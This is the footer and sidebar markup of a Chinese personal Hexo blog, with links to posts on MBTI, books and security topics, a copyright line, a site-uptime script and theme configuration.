<div class="rpost pjax">
  <h2>随机文章</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
</div>

    <span><a href="/2023/04/01/MBTI/ENTP%E8%A7%A3%E8%AF%BB/" title="ENTP解读">ENTP解读</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
</div>

    <span><a href="/2023/06/30/BOOK/1%E3%80%8A%E5%A4%A9%E6%89%8D%E5%9C%A8%E5%B7%A6%EF%BC%8C%E7%96%AF%E5%AD%90%E5%9C%A8%E5%8F%B3%E3%80%8B%E9%AB%98%E9%93%AD/" title="《天才在左，疯子在右》高铭">《天才在左，疯子在右》高铭</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
</div>

    <span><a href="/2023/06/30/BOOK/45%E3%80%8A%E5%B7%B4%E9%BB%8E%E5%9C%A3%E6%AF%8D%E9%99%A2%E3%80%8B%E9%9B%A8%E6%9E%9C/" title="《巴黎圣母院》雨果">《巴黎圣母院》雨果</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/07/04/SAFE/6%20%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%8F%8A%E5%88%A9%E7%94%A8/" title="未命名">未命名</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/07/04/SAFE/12%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" title="未命名">未命名</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/07/04/SAFE/9%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" title="未命名">未命名</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
</div>

    <span><a href="/2023/04/01/MBTI/%E5%88%BB%E6%9D%BF%E5%8D%B0%E8%B1%A1/" title="刻板印象">刻板印象</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
</div>

    <span><a href="/2023/06/30/BOOK/14%E3%80%8A%E4%B8%8E%E6%8A%91%E9%83%81%E7%97%87%E7%9B%B8%E4%BC%B4%E7%9A%84%E6%97%A5%E5%AD%90%E3%80%8B%E9%A9%AC%E4%BF%AE/" title="《与抑郁症相伴的日子》马修">《与抑郁症相伴的日子》马修</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
</div>

    <span><a href="/2023/06/30/BOOK/19%E3%80%8A%E8%AE%A9%E4%BD%A0%E7%88%B1%E4%B8%8D%E9%87%8A%E6%89%8B%E7%9A%84%E6%9E%81%E7%AE%80%E4%B8%96%E7%95%8C%E5%8F%B2%E3%80%8B%E5%A7%9A%E5%B0%A7/" title="《让你爱不释手的极简世界史》姚尧">《让你爱不释手的极简世界史》姚尧</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="分类于 信息安全">信息安全</a>
</div>

    <span><a href="/2023/07/02/SAFE/Security%20URL/" title="信息安全 网址">信息安全 网址</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>最新评论</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">.N1h1l157 @ Phut Hon</span>
  </div>

<!--   自定义开启一个网站的运行时间 -->
  <div class="site-uptime">
    Site uptime: <span id="site-uptime"></span>
  </div>
  <script>
    var siteUptimeElement = document.getElementById('site-uptime');
    var siteSetupDate = new Date('2023-03-18'); // 替换为您的网站具体创建日期，格式为 'YYYY-MM-DD'
    setInterval(function() {
      var currentTime = new Date();
      var uptime = formatUptime(currentTime - siteSetupDate);
      siteUptimeElement.textContent = uptime;
    }, 1000);

    function formatUptime(milliseconds) {
      var seconds = Math.floor(milliseconds / 1000);
      var minutes = Math.floor(seconds / 60);
      var hours = Math.floor(minutes / 60);
      var days = Math.floor(hours / 24);

      var uptime = '';
      if (days > 0) {
        uptime += days + '天 ';
      }
      if (hours > 0) {
        uptime += (hours % 24) + '时 ';
      }
      if (minutes > 0) {
        uptime += (minutes % 60) + '分 ';
      }
      uptime += (seconds % 60) + '秒';

      return uptime;
    }
  </script>
  <div class="powered-by">
    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2023/07/04/SAFE/9 权限提升/',
    favicon: {
      show: "Cryp71c3",
      hide: "十年磨一剑"
    },
    search : {
      placeholder: "文章搜索",
      empty: "关于 「 ${query} 」，什么也没搜到",
      stats: "${time} ms 内找到 ${hits} 条结果"
    },
    valine: true,fancybox: true,
    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
